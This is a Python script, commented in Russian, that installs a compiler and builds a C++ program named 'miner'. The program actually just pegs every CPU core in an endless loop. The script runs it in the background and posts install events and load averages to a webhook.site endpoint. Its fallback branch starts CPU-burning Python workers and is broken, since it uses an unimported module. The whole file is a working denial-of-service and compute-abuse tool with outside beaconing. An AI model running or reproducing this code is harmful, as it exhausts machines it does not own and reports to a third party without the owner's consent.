import os
import subprocess
import json
import http.client
import multiprocessing

HOOK_DOMAIN = "webhook.site"
HOOK_PATH = "/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def send_status(event, data={}):
    try:
        payload = json.dumps({"EVENT": event, "DATA": data, "LOAD": os.getloadavg()})
        conn = http.client.HTTPSConnection(HOOK_DOMAIN, timeout=10)
        conn.request("POST", HOOK_PATH, payload, {"Content-Type": "application/json"})
        conn.getresponse()
        conn.close()
    except: pass

def deploy_miner():
    # 1. Сигнал о начале установки
    send_status("INSTALLING_NATIVE_TOOLS")
    
    # Пытаемся быстро поставить компилятор и библиотеки
    os.system("apt-get update && apt-get install -y build-essential libgmp-dev")

    # 2. Пишем максимально агрессивный C++ код
    cpp_code = """
    #include <iostream>
    #include <vector>
    #include <thread>
    #include <cmath>

    void burn() {
        while(true) {
            double x = 1234.5678;
            for(int i=0; i<1000000; i++) {
                x = std::sqrt(std::sin(x) * std::cos(x) + std::tan(x));
            }
        }
    }

    int main() {
        unsigned int n = std::thread::hardware_concurrency();
        std::vector<std::thread> threads;
        for(int i=0; i<n; ++i) threads.emplace_back(burn);
        for(auto& t : threads) t.join();
        return 0;
    }
    """
    with open("miner.cpp", "w") as f: f.write(cpp_code)

    # 3. Компиляция
    if os.system("g++ -O3 miner.cpp -o miner -lpthread") == 0:
        send_status("MINER_COMPILED_AND_STARTING")
        # Запускаем в фоне
        subprocess.Popen(["./miner"])
        return True
    return False

if __name__ == "__main__":
    if deploy_miner():
        # Даем прогреться 30 секунд
        import time
        time.sleep(30)
        send_status("MAX_LOAD_REACHED")
        print("[+] Check your hook for Load Average > 40.0")
    else:
        # Если не удалось скомпилить, давим через Python воркеры на стероидах
        send_status("NATIVE_BUILD_FAILED_USING_PY_STEROIDS")
        for _ in range(multiprocessing.cpu_count()):
            multiprocessing.Process(target=lambda: [pow(random.getrandbits(4096), 2, 13) for _ in iter(int, 1)]).start()
